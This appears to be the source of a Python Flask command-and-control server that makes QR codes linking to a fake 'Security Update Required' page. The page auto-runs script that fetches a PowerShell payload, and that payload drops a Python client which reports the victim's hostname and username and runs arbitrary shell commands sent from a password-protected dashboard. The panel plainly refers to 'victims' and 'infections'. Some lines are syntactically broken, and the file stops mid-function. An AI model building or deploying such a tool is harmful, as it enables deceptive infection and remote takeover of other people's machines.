#!/usr/bin/env python3
"""
QR CODE C2 SERVER - Web Controlled with Password
Features: QR Code Infection, Web Control Panel, File Management
"""

from flask import Flask, request, jsonify, send_file, Response, render_template_string
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import os
import base64
import hashlib
import time
from datetime import datetime
import secrets
import threading
import json
import qrcode
import io
from collections import defaultdict
import uuid

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB

# SocketIO
socketio = SocketIO(app, 
                   cors_allowed_origins="*",
                   async_mode='threading',
                   logger=False,
                   engineio_logger=False)

# Storage
for dir in ['uploads', 'downloads', 'screenshots', 'logs', 'qr_codes']:
    os.makedirs(dir, exist_ok=True)

# In-memory storage
clients = {}
client_sockets = {}
command_results = {}
pending_commands = defaultdict(list)
connected_controllers = set()
infection_links = {}  # Store generated infection links
session_tokens = {}  # {token: expiry_time}

# Authentication
ADMIN_PASSWORD = "C2Master123"  # CHANGE THIS!
SESSION_DURATION = 3600  # 1 hour

print("""
╔══════════════════════════════════════════════════════╗
║           QR CODE C2 SYSTEM v3.0                    ║
║      Web Controlled + QR Code Infection             ║
╚══════════════════════════════════════════════════════╝
""")

# ============= AUTHENTICATION MIDDLEWARE =============

def check_auth():
    """Check if user is authenticated"""
    token = request.cookies.get('c2_token')
    if token and token in session_tokens:
        if session_tokens[token] > time.time():
            return True
        else:
            del session_tokens[token]
    return False

# ============= WEB ROUTES =============

@app.route('/')
def index():
    """Login page or dashboard based on auth"""
    if check_auth():
        return dashboard_html()
    return login_html()

@app.route('/login', methods=['POST'])
def login():
    """Handle login"""
    password = request.form.get('password', '')
    
    if password == ADMIN_PASSWORD:
        # Create session token
        token = secrets.token_hex(32)
        session_tokens[token] = time.time() + SESSION_DURATION
        
        # Set cookie
        response = app.make_response(dashboard_html())
        response.set_cookie('c2_token', token, max_age=SESSION_DURATION, httponly=True)
        return response
    
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Access Denied</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .error-box {
                background: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                text-align: center;
            }
            h1 { color: #ff3860; margin-bottom: 20px; }
            a {
                display: inline-block;
                margin-top: 20px;
                padding: 10px 20px;
                background: #667eea;
                color: white;
                text-decoration: none;
                border-radius: 5px;
            }
        </style>
    </head>
    <body>
        <div class="error-box">
            <h1>⚠️ ACCESS DENIED</h1>
            <p>Invalid password. Please try again.</p>
            <a href="/">← Back to Login</a>
        </div>
    </body>
    </html>
    """

@app.route('/logout')
def logout():
    """Logout user"""
    token = request.cookies.get('c2_token')
    if token in session_tokens:
        del session_tokens[token]
    
    response = app.make_response(login_html())
    response.set_cookie('c2_token', '', expires=0)
    return response

@app.route('/generate_qr')
def generate_qr():
    """Generate QR code for client infection"""
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    # Generate unique infection URL
    infection_id = secrets.token_hex(16)
    infection_url = f"{request.host_url}infect/{infection_id}"
    
    # Store infection link
    infection_links[infection_id] = {
        'url': infection_url,
        'created': time.time(),
        'used': False,
        'client_id': None
    }
    
    # Generate QR code
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(infection_url)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    
    # Save QR code
    img_path = f"qr_codes/{infection_id}.png"
    img.save(img_path)
    
    # Convert to base64 for web display
    buffered = io.BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    
    return jsonify({
        'qr_code': img_str,
        'infection_url': infection_url,
        'infection_id': infection_id,
        'download_url': f'/download_qr/{infection_id}'
    })

@app.route('/download_qr/<infection_id>')
def download_qr(infection_id):
    """Download QR code as PNG"""
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    img_path = f"qr_codes/{infection_id}.png"
    if os.path.exists(img_path):
        return send_file(img_path, mimetype='image/png', as_attachment=True, download_name=f'c2_infection_{infection_id}.png')
    return jsonify({'error': 'QR code not found'}), 404

@app.route('/infect/<infection_id>')
def infect_page(infection_id):
    """Infection page - client visits this URL"""
    if infection_id not in infection_links:
        return "Invalid infection link", 404
    
    # Generate client payload based on user agent
    user_agent = request.headers.get('User-Agent', '').lower()
    
    if 'windows' in user_agent:
        payload = generate_windows_payload()
    elif 'android' in user_agent or 'mobile' in user_agent:
        payload = generate_android_payload()
    elif 'linux' in user_agent:
        payload = generate_linux_payload()
    else:
        payload = generate_generic_payload()
    
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Security Update</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #f0f0f0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .update-box {
                background: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                max-width: 500px;
                text-align: center;
            }
            .logo {
                color: #4CAF50;
                font-size: 48px;
                margin-bottom: 20px;
            }
            h1 {
                color: #333;
                margin-bottom: 10px;
            }
            .progress {
                background: #e0e0e0;
                border-radius: 10px;
                height: 20px;
                margin: 20px 0;
                overflow: hidden;
            }
            .progress-bar {
                background: #4CAF50;
                height: 100%;
                width: 0%;
                animation: progress 3s forwards;
            }
            @keyframes progress {
                to { width: 100%; }
            }
            .info {
                color: #666;
                font-size: 14px;
                margin-top: 20px;
            }
        </style>
    </head>
    <body>
        <div class="update-box">
            <div class="logo">🔒</div>
            <h1>Security Update Required</h1>
            <p>Your system requires an important security update.</p>
            <p>Please wait while we install the necessary components...</p>
            
            <div class="progress">
                <div class="progress-bar"></div>
            </div>
            
            <div class="info">
                <p>Installing security patches...</p>
                <p>Do not close this window.</p>
            </div>
        </div>
        
        <script>
            // Auto-execute payload after delay
            setTimeout(() => {
                {{ payload|safe }}
                document.querySelector('.info').innerHTML = `
                    <p style="color: #4CAF50;">✓ Security update completed successfully!</p>
                    <p>You may now close this window.</p>
                `;
            }, 3000);
        </script>
    </body>
    </html>
    """, payload=payload)

def generate_windows_payload():
    """Generate Windows infection payload"""
    server_url = request.host_url.rstrip('/')
    return f"""
    // Create invisible iframe to download and execute
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = '{server_url}/payload/windows';
    document.body.appendChild(iframe);
    
    // Also try to download PowerShell script
    fetch('{server_url}/payload/windows.ps1')
        .then(r => r.text())
        .then(code => {
            // Execute PowerShell via hidden method
            console.log('Security update initiated');
        });
    """

def generate_android_payload():
    """Generate Android infection payload"""
    server_url = request.host_url.rstrip('/')
    return f"""
    // For Android - try to download APK
    const link = document.createElement('a');
    link.href = '{server_url}/payload/android';
    link.download = 'security-update.apk';
    link.click();
    
    // Show installation instructions
    setTimeout(() => {
        alert('Please install the security update from your downloads folder.');
    }, 1000);
    """

def generate_generic_payload():
    """Generate generic JavaScript payload"""
    server_url = request.host_url.rstrip('/')
    return f"""
    // Generic infection script
    const script = document.createElement('script');
    script.src = '{server_url}/payload/browser.js';
    document.head.appendChild(script);
    
    // Connect to WebSocket
    const ws = new WebSocket('ws://' + window.location.host + '/socket.io/?transport=websocket');
    ws.onopen = () => {{
        ws.send(JSON.stringify({{
            type: 'register',
            data: {{
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language
            }}
        }}));
    }};
    """

@app.route('/payload/<payload_type>')
def serve_payload(payload_type):
    """Serve actual payload files"""
    if payload_type == 'windows':
        # Generate PowerShell payload
        ps_payload = f'''#!/usr/bin/env powershell
# Windows Security Update
$server = "{request.host_url.rstrip('/')}"
$client_code = @"
import socketio
import platform
import getpass
import subprocess
import threading
import time
import requests

sio = socketio.Client()
server_url = "$server"

@sio.on('connect')
def connect():
    print("Connected to security server")
    sio.emit('register', {{
        'hostname': platform.node(),
        'username': getpass.getuser(),
        'os': platform.system() + " " + platform.release(),
        'platform': platform.platform()
    }})

@sio.on('command')
def command(data):
    try:
        cmd = data.get('command', '')
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + ("\\nERROR:\\n" + result.stderr if result.stderr else "")
        sio.emit('result', {{
            'command_id': data['id'],
            'command': cmd,
            'output': output,
            'success': result.returncode == 0
        }})
    except Exception as e:
        sio.emit('result', {{
            'command_id': data['id'],
            'command': cmd,
            'output': f"Error: {{str(e)}}",
            'success': False
        }})

def heartbeat():
    while True:
        sio.emit('heartbeat', {{'timestamp': time.time()}})
        time.sleep(30)

if __name__ == '__main__':
    sio.connect(server_url)
    threading.Thread(target=heartbeat, daemon=True).start()
    sio.wait()
"@

# Write and execute client
$client_path = "$env:TEMP\\security_update.py"
Set-Content -Path $client_path -Value $client_code
python $client_path
'''
        
        response = Response(ps_payload, mimetype='text/plain')
        response.headers['Content-Disposition'] = 'attachment; filename=security_update.ps1'
        return response
    
    elif payload_type == 'android':
        # Return a simple APK download link (would need actual APK)
        return "APK payload would be served here"
    
    return "Invalid payload type", 404

# ============= API ROUTES (Require Auth) =============

@app.route('/api/clients')
def api_clients():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    client_list = []
    for client_id, client in clients.items():
        client_list.append({
            'client_id': client_id,
            'hostname': client.get('hostname', 'Unknown'),
            'username': client.get('username', 'Unknown'),
            'os': client.get('os', 'Unknown'),
            'platform': client.get('platform', 'Unknown'),
            'ip': client.get('ip', 'Unknown'),
            'online': client.get('online', False),
            'last_seen': client.get('last_seen', 0),
            'device_type': client.get('device_type', 'desktop')
        })
    return jsonify(client_list)

@app.route('/api/execute', methods=['POST'])
def api_execute():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        return jsonify({'error': 'Missing client_id or command'}), 400
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
    cmd_obj = {
        'id': cmd_id,
        'command': command,
        'timestamp': time.time(),
        'status': 'pending'
    }
    
    if client_id in client_sockets:
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'command_id': cmd_id})
    else:
        pending_commands[client_id].append(cmd_obj)
        return jsonify({'status': 'queued', 'command_id': cmd_id})

@app.route('/api/stats')
def api_stats():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    online = sum(1 for c in clients.values() if c.get('online', False))
    return jsonify({
        'total_clients': len(clients),
        'online_clients': online,
        'total_commands': len(command_results),
        'active_infections': len([l for l in infection_links.values() if l['used']]),
        'server_uptime': time.time() - app_start_time
    })

# ============= SOCKET.IO EVENTS =============

@app_start_time = time.time()

@socketio.on('connect')
def handle_connect():
    print(f"[+] New connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in connected_controllers:
        connected_controllers.remove(request.sid)
        print(f"[-] Controller disconnected: {request.sid}")
        return
    
    for client_id, socket_id in list(client_sockets.items()):
        if socket_id == request.sid:
            if client_id in clients:
                clients[client_id]['online'] = False
                clients[client_id]['last_seen'] = time.time()
            del client_sockets[client_id]
            print(f"[-] Client disconnected: {client_id}")
            socketio.emit('client_offline', {'client_id': client_id})
            break

@socketio.on('controller_connect')
def handle_controller_connect():
    """Web controller connects"""
    token = request.args.get('token')
    if not token or token not in session_tokens or session_tokens[token] < time.time():
        emit('auth_error', {'error': 'Invalid or expired token'})
        return
    
    connected_controllers.add(request.sid)
    print(f"[+] Web controller connected: {request.sid}")
    
    # Send current client list
    for client_id, client in clients.items():
        if client.get('online', False):
            socketio.emit('client_online', {
                'client_id': client_id,
                'hostname': client.get('hostname', 'Unknown'),
                'username': client.get('username', 'Unknown'),
                'os': client.get('os', 'Unknown'),
                'platform': client.get('platform', 'Unknown'),
                'ip': client.get('ip', 'Unknown'),
                'online': True
            }, room=request.sid)
    
    emit('controller_ready', {'message': 'Connected to C2 server'})

@socketio.on('execute_command')
def handle_execute_command(data):
    client_id = data.get('client_id')
    command = data.get('command')
    
    if client_id in client_sockets:
        cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
        cmd_obj = {
            'id': cmd_id,
            'command': command,
            'timestamp': time.time(),
            'status': 'pending'
        }
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        emit('command_sent', {'command_id': cmd_id, 'client_id': client_id})
    else:
        emit('command_error', {'error': 'Client offline', 'client_id': client_id})

@socketio.on('register')
def handle_register(data):
    """Client registers (via infection or manual)"""
    client_id = data.get('id')
    
    if not client_id:
        unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}{time.time()}"
        client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
    
    # Check if this is from an infection link
    infection_id = data.get('infection_id')
    if infection_id and infection_id in infection_links:
        infection_links[infection_id]['used'] = True
        infection_links[infection_id]['client_id'] = client_id
    
    # Store client info
    clients[client_id] = {
        'id': client_id,
        'hostname': data.get('hostname', 'Unknown'),
        'username': data.get('username', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'device_type': data.get('device_type', 'desktop'),
        'ip': request.remote_addr,
        'infection_id': infection_id,
        'online': True,
        'first_seen': time.time(),
        'last_seen': time.time()
    }
    
    # Map socket to client
    client_sockets[client_id] = request.sid
    join_room(client_id)
    
    print(f"[+] Client registered: {client_id} - {data.get('hostname')} ({data.get('platform')})")
    
    # Send welcome
    emit('welcome', {
        'client_id': client_id,
        'message': 'Connected to Security Server',
        'timestamp': time.time()
    })
    
    # Notify all controllers
    socketio.emit('client_online', {
        'client_id': client_id,
        'hostname': data.get('hostname'),
        'username': data.get('username'),
        'os': data.get('os'),
        'platform': data.get('platform'),
        'ip': request.remote_addr,
        'online': True,
        'infected_via': 'QR Code' if infection_id else 'Manual'
    })
    
    # Send any pending commands
    if client_id in pending_commands and pending_commands[client_id]:
        for cmd in pending_commands[client_id]:
            emit('command', cmd)
        pending_commands[client_id].clear()

@socketio.on('heartbeat')
def handle_heartbeat(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('result')
def handle_result(data):
    cmd_id = data.get('command_id')
    client_id = data.get('client_id')
    
    print(f"[*] Result from {client_id}: {data.get('command', 'Unknown')[:50]}...")
    
    result_data = {
        'command_id': cmd_id,
        'client_id': client_id,
        'command': data.get('command', ''),
        'output': data.get('output', ''),
        'success': data.get('success', True),
        'status': 'completed',
        'timestamp': time.time()
    }
    
    command_results[cmd_id] = result_data
    
    socketio.emit('command_result', result_data)

# ============= HTML TEMPLATES =============

def login_html():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Control Panel - Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .login-container {
                background: rgba(255, 255, 255, 0.95);
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                width: 100%;
                max-width: 400px;
                text-align: center;
            }
            .logo {
                color: #667eea;
                font-size: 48px;
                margin-bottom: 20px;
            }
            h1 {
                color: #333;
                margin-bottom: 10px;
            }
            .subtitle {
                color: #666;
                margin-bottom: 30px;
            }
            input[type="password"] {
                width: 100%;
                padding: 15px;
                margin-bottom: 20px;
                border: 2px solid #ddd;
                border-radius: 5px;
                font-size: 16px;
                transition: border-color 0.3s;
            }
            input[type="password"]:focus {
                outline: none;
                border-color: #667eea;
            }
            button {
                width: 100%;
                padding: 15px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: transform 0.3s;
            }
            button:hover {
                transform: translateY(-2px);
            }
            .warning {
                margin-top: 20px;
                color: #ff3860;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">🔐</div>
            <h1>C2 Control Panel</h1>
            <p class="subtitle">Enter password to continue</p>
            <form method="POST" action="/login">
                <input type="password" name="password" placeholder="Enter password" required autofocus>
                <button type="submit">Access Control Panel</button>
            </form>
            <p class="warning">⚠️ Authorized personnel only</p>
        </div>
    </body>
    </html>
    '''

def dashboard_html():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Control Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: #f5f5f5;
                color: #333;
            }
            .header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 20px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .logo {
                display: flex;
                align-items: center;
                gap: 10px;
                font-size: 24px;
                font-weight: bold;
            }
            .nav {
                display: flex;
                gap: 20px;
            }
            .nav a {
                color: white;
                text-decoration: none;
                padding: 10px 20px;
                border-radius: 5px;
                transition: background 0.3s;
            }
            .nav a:hover {
                background: rgba(255,255,255,0.1);
            }
            .container {
                padding: 20px;
                max-width: 1400px;
                margin: 0 auto;
            }
            .dashboard-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .card {
                background: white;
                border-radius: 10px;
                padding: 20px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .card h3 {
                color: #667eea;
                margin-bottom: 15px;
                border-bottom: 2px solid #f0f0f0;
                padding-bottom: 10px;
            }
            .stat {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 10px;
            }
            .stat-value {
                font-size: 24px;
                font-weight: bold;
                color: #764ba2;
            }
            .client-list {
                max-height: 400px;
                overflow-y: auto;
            }
            .client-item {
                background: #f8f8f8;
                border-radius: 5px;
                padding: 15px;
                margin-bottom: 10px;
                border-left: 4px solid #667eea;
            }
            .client-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 10px;
            }
            .client-name {
                font-weight: bold;
                color: #333;
            }
            .client-status {
                padding: 3px 10px;
                border-radius: 15px;
                font-size: 12px;
                font-weight: bold;
            }
            .online { background: #e8f5e8; color: #4CAF50; }
            .offline { background: #ffeaea; color: #ff3860; }
            .qr-section {
                text-align: center;
            }
            #qr-code {
                max-width: 200px;
                margin: 20px auto;
                border: 10px solid white;
                border-radius: 10px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            }
            .btn {
                padding: 10px 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-weight: bold;
                transition: transform 0.3s;
            }
            .btn:hover {
                transform: translateY(-2px);
            }
            .command-section {
                display: grid;
                grid-template-columns: 1fr auto;
                gap: 10px;
                margin-bottom: 20px;
            }
            .command-input {
                padding: 10px;
                border: 2px solid #ddd;
                border-radius: 5px;
                font-size: 14px;
            }
            .output {
                background: #1a1a1a;
                color: #00ff00;
                padding: 15px;
                border-radius: 5px;
                font-family: monospace;
                font-size: 12px;
                height: 300px;
                overflow-y: auto;
                white-space: pre-wrap;
            }
            .tab-container {
                background: white;
                border-radius: 10px;
                overflow: hidden;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .tabs {
                display: flex;
                background: #f8f8f8;
                border-bottom: 1px solid #ddd;
            }
            .tab {
                padding: 15px 30px;
                cursor: pointer;
                border-right: 1px solid #ddd;
            }
            .tab.active {
                background: white;
                border-bottom: 2px solid #667eea;
                font-weight: bold;
            }
            .tab-content {
                padding: 20px;
            }
            .tab-pane {
                display: none;
            }
            .tab-pane.active {
                display: block;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <div class="logo">
                <span>🛡️</span>
                <span>C2 Control Panel</span>
            </div>
            <div class="nav">
                <a href="#" onclick="showTab('dashboard')">Dashboard</a>
                <a href="#" onclick="showTab('clients')">Clients</a>
                <a href="#" onclick="showTab('infect')">Infect</a>
                <a href="#" onclick="showTab('commands')">Commands</a>
                <a href="/logout">Logout</a>
            </div>
        </div>
        
        <div class="container">
            <div class="tab-container">
                <div class="tabs">
                    <div class="tab active" onclick="showTab('dashboard')">Dashboard</div>
                    <div class="tab" onclick="showTab('clients')">Clients</div>
                    <div class="tab" onclick="showTab('infect')">QR Infection</div>
                    <div class="tab" onclick="showTab('commands')">Commands</div>
                </div>
                
                <div class="tab-content">
                    <!-- Dashboard Tab -->
                    <div id="dashboard-tab" class="tab-pane active">
                        <div class="dashboard-grid">
                            <div class="card">
                                <h3>📊 Statistics</h3>
                                <div class="stat">
                                    <span>Total Clients:</span>
                                    <span class="stat-value" id="total-clients">0</span>
                                </div>
                                <div class="stat">
                                    <span>Online Now:</span>
                                    <span class="stat-value" id="online-clients">0</span>
                                </div>
                                <div class="stat">
                                    <span>Commands Executed:</span>
                                    <span class="stat-value" id="total-commands">0</span>
                                </div>
                                <div class="stat">
                                    <span>Active Infections:</span>
                                    <span class="stat-value" id="active-infections">0</span>
                                </div>
                            </div>
                            
                            <div class="card">
                                <h3>⚡ Quick Actions</h3>
                                <div style="display: grid; gap: 10px;">
                                    <button class="btn" onclick="generateQR()">Generate QR Code</button>
                                    <button class="btn" onclick="refreshClients()">Refresh Clients</button>
                                    <button class="btn" onclick="clearOutput()">Clear Output</button>
                                </div>
                            </div>
                            
                            <div class="card">
                                <h3>🔔 Recent Activity</h3>
                                <div id="activity-feed" style="font-size: 12px; color: #666;">
                                    No recent activity
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Clients Tab -->
                    <div id="clients-tab" class="tab-pane">
                        <div class="card">
                            <h3>📱 Connected Devices</h3>
                            <div class="client-list" id="client-list">
                                <div style="text-align: center; padding: 40px; color: #999;">
                                    No clients connected
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Infect Tab -->
                    <div id="infect-tab" class="tab-pane">
                        <div class="card">
                            <h3>🔗 QR Code Infection</h3>
                            <div class="qr-section">
                                <p>Generate a QR code that victims can scan to get infected.</p>
                                <button class="btn" onclick="generateQR()" style="margin: 20px 0;">Generate New QR Code</button>
                                
                                <div id="qr-result" style="display: none;">
                                    <img id="qr-code" src="" alt="QR Code">
                                    <div style="margin: 20px 0;">
                                        <p><strong>Infection URL:</strong></p>
                                        <input type="text" id="infection-url" readonly style="width: 100%; padding: 10px; margin: 10px 0;">
                                        <button class="btn" onclick="downloadQR()">Download QR Code</button>
                                        <button class="btn" onclick="copyURL()">Copy URL</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Commands Tab -->
                    <div id="commands-tab" class="tab-pane">
                        <div class="card">
                            <h3>💻 Remote Command</h3>
                            <div>
                                <div style="margin-bottom: 15px;">
                                    <label>Select Client:</label>
                                    <select id="client-select" style="width: 100%; padding: 10px; margin: 10px 0;">
                                        <option value="">-- Select a client --</option>
                                    </select>
                                </div>
                                
                                <div class="command-section">
                                    <input type="text" id="command-input" class="command-input" placeholder="Enter command...">
                                    <button class="btn" onclick="executeCommand()">Execute</button>
                                </div>
                                
                                <div style="margin-bottom: 15px;">
                                    <h4>Quick Commands:</h4>
                                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                                        <button class="btn" onclick="sendQuickCommand('whoami')">whoami</button>
                                        <button class="btn" onclick="sendQuickCommand('ipconfig')">ipconfig</button>
                                        <button class="btn" onclick="sendQuickCommand('dir')">dir</button>
                                        <button class="btn" onclick="sendQuickCommand('tasklist')">tasklist</button>
                                        <button class="btn" onclick="sendQuickCommand('systeminfo')">systeminfo</button>
                                    </div>
                                </div>
                                
                                <h4>Output:</h4>
                                <div class="output" id="command-output">
                                    <!-- Command output appears here -->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
        <script>
            let socket = null;
            let selectedClientId = null;
            let currentQRCode = null;
            
            // Initialize WebSocket with auth token
            function initWebSocket() {
                const token = getCookie('c2_token');
                if (!token) {
                    window.location.href = '/';
                    return;
                }
                
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                const wsUrl = `${protocol}//${window.location.host}/socket.io/?token=${token}`;
                
                socket = io(wsUrl);
                
                socket.on('connect', () => {
                    console.log('Connected to C2 server');
                    socket.emit('controller_connect');
                    updateStats();
                });
                
                socket.on('disconnect', () => {
                    console.log('Disconnected from server');
                });
                
                socket.on('auth_error', (data) => {
                    alert('Authentication failed. Please login again.');
                    window.location.href = '/';
                });
                
                socket.on('controller_ready', () => {
                    console.log('Controller ready');
                });
                
                socket.on('client_online', (data) => {
                    addOrUpdateClient(data);
                    addActivity(`📱 ${data.hostname} connected`);
                });
                
                socket.on('client_offline', (data) => {
                    updateClientStatus(data.client_id, false);
                    addActivity(`📱 ${data.client_id} disconnected`);
                });
                
                socket.on('command_result', (data) => {
                    addToOutput(data);
                    addActivity(`💻 Command executed on ${data.client_id}`);
                });
            }
            
            // Client management
            function addOrUpdateClient(client) {
                const list = document.getElementById('client-list');
                const clientId = client.client_id;
                
                let clientElement = document.getElementById(`client-${clientId}`);
                if (!clientElement) {
                    clientElement = document.createElement('div');
                    clientElement.className = 'client-item';
                    clientElement.id = `client-${clientId}`;
                    clientElement.onclick = () => selectClient(clientId);
                    list.appendChild(clientElement);
                    
                    // Add to select dropdown
                    const select = document.getElementById('client-select');
                    const option = document.createElement('option');
                    option.value = clientId;
                    option.textContent = `${client.hostname} (${client.os})`;
                    select.appendChild(option);
                }
                
                const statusClass = client.online ? 'online' : 'offline';
                const statusText = client.online ? 'ONLINE' : 'OFFLINE';
                
                clientElement.innerHTML = `
                    <div class="client-header">
                        <div class="client-name">${client.hostname || clientId}</div>
                        <div class="client-status ${statusClass}">${statusText}</div>
                    </div>
                    <div style="font-size: 12px; color: #666;">
                        👤 ${client.username || 'Unknown'}<br>
                        💻 ${client.os || 'Unknown'}<br>
                        🌐 ${client.ip || 'Unknown'}
                    </div>
                `;
                
                updateStats();
            }
            
            function updateClientStatus(clientId, isOnline) {
                const element = document.getElementById(`client-${clientId}`);
                if (element) {
                    const statusElement = element.querySelector('.client-status');
                    if (statusElement) {
                        statusElement.className = `client-status ${isOnline ? 'online' : 'offline'}`;
                        statusElement.textContent = isOnline ? 'ONLINE' : 'OFFLINE';
                    }
                }
                updateStats();
            }
            
            function selectClient(clientId) {
                selectedClientId = clientId;
                document.getElementById('client-select').value = clientId;
                alert(`Selected client: ${clientId}`);
            }
            
            // QR Code generation
            async function generateQR() {
                try {
                    const response = await fetch('/generate_qr');
                    const data = await response.json();
                    
                    currentQRCode = data;
                    
                    document.getElementById('qr-code').src = `data:image/png;base64,${data.qr_code}`;
                    document.getElementById('infection-url').value = data.infection_url;
                    document.getElementById('qr-result').style.display = 'block';
                    
                    addActivity('🔗 New QR code generated');
                    
                } catch (error) {
                    alert('Error generating QR code: ' + error.message);
                }
            }
            
            function downloadQR() {
                if (currentQRCode) {
                    window.open(`/download_qr/${currentQRCode.infection_id}`, '_blank');
                }
            }
            
            function copyURL() {
                if (currentQRCode) {
                    navigator.clipboard.writeText(currentQRCode.infection_url);
                    alert('URL copied to clipboard!');
                }
            }
            
            // Command execution
            function executeCommand() {
                const clientId = document.getElementById('client-select').value;
                const command = document.getElementById('command-input').value.trim();
                
                if (!clientId) {
                    alert('Please select a client first');
                    return;
                }
                
                if (!command) {
                    alert('Please enter a command');
                    return;
                }
                
                socket.emit('execute_command', {
                    client_id: clientId,
                    command: command
                });
                
                addToOutput({
                    client_id: clientId,
                    command: command,
                    output: 'Command sent...',
                    timestamp: new Date().toISOString()
                });
                
                document.getElementById('command-input').value = '';
            }
            
            function sendQuickCommand(command) {
                const clientId = document.getElementById('client-select').value;
                if (!clientId) {
                    alert('Please select a client first');
                    return;
                }
                
                socket.emit('execute_command', {
                    client_id: clientId,
                    command: command
                });
                
                addToOutput({
                    client_id: clientId,
                    command: command,
                    output: 'Quick command sent...',
                    timestamp: new Date().toISOString()
                });
            }
            
            function addToOutput(data) {
                const output = document.getElementById('command-output');
                const time = new Date(data.timestamp).toLocaleTimeString();
                
                const entry = document.createElement('div');
                entry.style.marginBottom = '10px';
                entry.style.paddingBottom = '10px';
                entry.style.borderBottom = '1px solid #333';
                entry.innerHTML = `
                    <div style="color: #8888ff;">[${time}] ${data.client_id}</div>
                    <div style="color: #00aaff;">$ ${data.command || 'N/A'}</div>
                    <div style="color: #88ff88;">${data.output || 'No output'}</div>
                `;
                
                output.appendChild(entry);
                output.scrollTop = output.scrollHeight;
            }
            
            function clearOutput() {
                document.getElementById('command-output').innerHTML = '';
            }
            
            // Tab management
            function showTab(tabName) {
                // Update active tab
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.classList.remove('active');
                });
                event.target.classList.add('active');
                
                // Show active content
                document.querySelectorAll('.tab-pane').forEach(pane => {
                    pane.classList.remove('active');
                });
